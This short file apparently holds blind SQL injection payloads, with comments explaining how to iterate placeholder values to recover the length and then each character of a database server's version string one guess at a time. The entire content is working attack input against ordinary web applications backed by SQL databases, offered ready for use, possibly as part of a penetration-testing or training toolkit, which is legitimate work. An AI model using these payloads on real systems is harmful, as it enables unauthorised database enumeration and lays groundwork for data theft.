/* SQL payload for revealing the length of the database server version string.
  "NUMBER" is meant to be replaced with increasing integer values between 1 and 50 until the query returns true. */
1 and length(@@version)=NUMBER#

/* SQL payload for revealing the character at a certain position of the database server version string.
  "POSITION" is meant to be replaced with increasing integer values between 1 and the string length until all characters in the string has been found.
  "CHARACTER" is meant to be replaced with an ASCII character code between 32 and 126 until the query returns true. */
1 and ascii(substring(@@version,POSITION,1))=CHARACTER#
